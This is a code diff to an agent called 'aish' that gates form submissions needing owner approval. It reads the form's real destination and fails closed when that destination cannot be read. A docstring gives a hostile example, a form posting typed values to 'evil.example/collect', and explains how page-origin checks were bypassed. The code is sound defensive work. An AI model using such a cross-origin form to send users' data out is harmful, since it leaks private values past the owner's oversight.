@@ -1496,8 +1496,16 @@ EGRESS_NO_APPROVER = (
 
 # The DRIVEN TWIN of the composed address (#295 M3). Same question, same vouch,
 # different mechanism: a form submit carrying values aish itself typed is a
-# composed query URL that a page built instead of a string concatenation. The
-# sentence never names a tool (P1) — it says what would leave the machine and
+# composed query URL that a page built instead of a string concatenation.
+#
+# `{host}` is where the FORM sends, never the page the button sits on (#346) —
+# the prose above claims parity and the two mechanisms have to resolve the
+# destination the same way for it to be true. The
+# composed twin parses the host out of the address; this one reads it off the
+# form's own resolved action, which is what `browser.SIGNIN_FORM_JS` has done
+# for the password path since #273.
+#
+# The sentence never names a tool (P1) — it says what would leave the machine and
 # where it would go, exactly as the composed-address card does, and it rides the
 # press card rather than drawing a second one (M1's law: one press, one card).
 SEND_GRANT = "send data to {host} — pressing this {finding}."
@@ -1594,6 +1602,18 @@ DRIVEN_CARRIES = (
 # strict unattended rule gates a payload at a host the owner DID name, so
 # saying "you have never agreed" there would state something no line checked.
 DRIVEN_UNATTENDED_CARRIES = "would send {n} value(s) aish typed into the page"
+
+# What the send clause names when the form's own destination could not be read
+# (#346). It is a DESTINATION for the card to name and never a host: it can
+# never be in `_approved_hosts`, so the press is treated as unvouched and asks;
+# and `_press_card` keeps it out of `_vouch_hosts`, because the vouch store is
+# machine-wide and permanent and a sentence is not a host — the same rule
+# `SEARCH_ENGINE_DESTINATION` is held to, for the same reason.
+#
+# It says what was actually established. aish did not find a hostile
+# destination; it found that it cannot say where the form goes, and a card that
+# claimed more than that would be a cause no line checked.
+UNREADABLE_DESTINATION = "a destination aish cannot read"
 
 # `_payload_finding` returns the sentence the ATTENDED card says. These three
 # are its findings for the cases the attended card does not word: a search
@@ -2011,6 +2031,23 @@ REMEMBER_NO_APPROVER = (
     "write needs the owner's review and no approver is available. State the "
     "fact in your report instead; the owner can save it."
 )
+
+
+def _exact_host(url: str) -> str:
+    """The host of an address in `_approved_hosts`' vocabulary, or "".
+
+    ONE reader for every path that decides a send vouch — the composed address,
+    the page a value was typed at, and the form's own destination (#346) — so
+    the three cannot spell one site three ways. Lowercase, no port, no
+    www-stripping: the vouch is EXACT-matched, and `_browse_host` speaks the
+    other, suffix-matched vocabulary.
+
+    "" for anything with no host in it, which every caller reads as *nothing was
+    established here* rather than as an answer."""
+    try:
+        return (urllib.parse.urlsplit(url).hostname or "").lower()
+    except ValueError:
+        return ""
 
 
 def _hosts_in_text(text: str) -> set[str]:
@@ -7393,12 +7430,48 @@ class Agent:
         An EMPTY value is not recorded. Clearing a field sends nothing, and the
         question this record answers is what would ride the submit."""
         typed = [(target, value) for target, value in browse.typed_values(name, args) if value]
-        host = self._driven_host(name, args)
+        host = self._typed_at_host(name, args)
         if host and typed:
             self._typed_this_task.setdefault(host, []).extend(typed)
 
+    def _typed_at_host(self, name: str, args: dict) -> str:
+        """The EXACT host of the page these values are being typed INTO.
+
+        The ledger key, and only that: it answers *what has aish typed here*,
+        which is a fact about the page in front of it. Where those values would
+        GO is a different question with a different answer, and `_driven_host`
+        is the one that asks it (#346) — a form on this page may post anywhere.
+
+        EXACT, never `_browse_host`'s www-stripped spelling, so a value typed at
+        `www.shop.example` and a value typed at `shop.example` are not silently
+        pooled into one press."""
+        if name == "browse":
+            url = str(args.get("url", "") or "")
+        else:
+            current = self._browse_view.shown
+            url = current.url if current is not None else ""
+        return _exact_host(url)
+
     def _driven_host(self, name: str, args: dict) -> str:
-        """The EXACT host a submit would send to, `_approved_hosts`' vocabulary.
+        """The EXACT host a submit would SEND to, `_approved_hosts`' vocabulary
+        — or "" when this call submits nothing.
+
+        **The form's own destination, never the page's address (#346).** A
+        page's origin says nothing about where its forms send: a page on a host
+        the owner vouched may carry `<form action="https://evil.example/collect">`,
+        and reading the page's host there freed the submit while the identical
+        values in a composed URL to `evil.example` drew a card. That is the
+        assumption `browser.SIGNIN_FORM_JS` has existed to reject since #273,
+        reintroduced one gate over. `Control.sends_to` carries the resolved
+        destination out of the enumeration, because only the page can resolve a
+        relative `action="/checkout"` against its own base.
+
+        **It FAILS CLOSED.** A control that submits but whose destination could
+        not be read — no `<form>` at all (a script may submit it anywhere), a
+        `mailto:`/`javascript:` action, a string no parser accepts — comes back
+        as `UNREADABLE_DESTINATION`, which is in no vouch set and never will be,
+        so the press asks. A destination aish cannot read is not a destination
+        it may assume.
 
         Deliberately NOT `_browse_host`, which strips `www.` — that one speaks
         `_approved_sites`' vocabulary, where the grant is suffix-matched and the
@@ -7408,16 +7481,16 @@ class Agent:
         naming one host while vouching another breaks the invariant that what
         enters `_approved_hosts` is exactly what the preview put in front of
         him. So a merged card can name two spellings of the same site, one per
-        clause, because the two clauses grant differently matched things."""
-        if name == "browse":
-            url = str(args.get("url", "") or "")
-        else:
-            current = self._browse_view.shown
-            url = current.url if current is not None else ""
-        try:
-            return (urllib.parse.urlsplit(url).hostname or "").lower()
-        except ValueError:
+        clause, because the two clauses grant differently matched things.
+
+        And the host is read with the SAME parser the composed twin uses
+        (`urlsplit(...).hostname` — lowercase, no port), because parity is the
+        whole claim: a second spelling here would make one site two hosts and a
+        yes given on one channel fail to answer the other."""
+        control = self._submitting_control(name, args)
+        if control is None:
             return ""
+        return _exact_host(getattr(control, "sends_to", "")) or UNREADABLE_DESTINATION
 
     def _submitting_control(self, name: str, args: dict):
         """The control this call would press to SEND a form, or None.
@@ -7526,10 +7599,17 @@ class Agent:
         Unattended keeps the strict rule reads already keep: every submit
         carrying typed values gates, vouch or no vouch, because nobody is going
         to read the answer either way."""
-        host = self._driven_host(name, args)
-        if not host or self._submitting_control(name, args) is None:
+        # TWO hosts, and conflating them is the defect this pair exists to
+        # prevent (#346). The LEDGER is keyed by the page the values were typed
+        # at; the VOUCH is asked about where the form would send them. A form
+        # on a vouched page may post cross-origin, so one answer cannot serve
+        # both questions.
+        destination = self._driven_host(name, args)
+        if not destination:
             return ""
-        carried = self._values_riding_this_press(name, args, host)
+        carried = self._values_riding_this_press(
+            name, args, self._typed_at_host(name, args)
+        )
         if not carried:
             return ""
         for value in (v for _, v in carried):
@@ -7546,7 +7626,10 @@ class Agent:
             if _addresses_in_text(urllib.parse.unquote(value)):
                 return "has a second address written inside it"
         attended = self.origin == "user"
-        if attended and host in self._approved_hosts:
+        # The DESTINATION is what a vouch answers for. `UNREADABLE_DESTINATION`
+        # is in no vouch set, so a submit aish cannot read the destination of
+        # asks — fail closed, by the value it carries rather than by a branch.
+        if attended and destination in self._approved_hosts:
             return ""
         template = DRIVEN_CARRIES if attended else DRIVEN_UNATTENDED_CARRIES
         return template.format(n=len(carried))
@@ -7760,8 +7843,10 @@ class Agent:
         approval record, and a record quoting his address would be the leak this
         whole slice exists to prevent."""
         key = _ledger_host(host)
+        # The page these values are being typed AT, which is what the ledger is
+        # keyed by — never where a form on it would send them (#346).
         riding = self._values_riding_this_press(
-            name, args, self._driven_host(name, args)
+            name, args, self._typed_at_host(name, args)
         )
         typed = [value for _, value in riding]
         found: list[str] = []
@@ -8201,9 +8286,11 @@ class Agent:
         would read as part of that value."""
         granted = self._site_granted(host)
         sending = self._driven_finding(name, args)
-        # The EXACT host, never `host`: the send vouch is exact-matched and the
-        # press grant is suffix-matched, so the two clauses of one card may
-        # legitimately spell the same site differently (see `_driven_host`).
+        # The EXACT host the FORM would send to, never `host` — which is the
+        # page the button sits on, and says nothing about where it posts
+        # (#346). The send vouch is also exact-matched where the press grant is
+        # suffix-matched, so the two clauses of one card may legitimately spell
+        # the same site differently (see `_driven_host`).
         send_host = self._driven_host(name, args)
         # An inert press on a site with no grant asks nothing and RECORDS
         # nothing (#295 M4) — see `_grant_is_due`. The send clause below is a
@@ -8278,7 +8365,16 @@ class Agent:
             # — the two grants stay disjoint (`_grant_site` above writes the
             # other one), and neither is ever filled from the other. Exactly the
             # host the clause NAMED, which is residual (c)'s invariant.
-            self._vouch_hosts([send_host])
+            #
+            # …unless the clause named the PLACEHOLDER, which is not a host and
+            # must never enter a store that is machine-wide and permanent
+            # (#346). A yes there answers for this one press and vouches
+            # nothing, because aish cannot say what it would be vouching for.
+            # Filtered at the one call site that writes it, exactly as
+            # `SEARCH_ENGINE_DESTINATION` is, and pinned by a test.
+            self._vouch_hosts(
+                [] if send_host == UNREADABLE_DESTINATION else [send_host]
+            )
         if typing:
             # Per (class, host), for this task — exactly what the clause said,
             # and no wider. It is the SAME ledger the composed-address arm reads
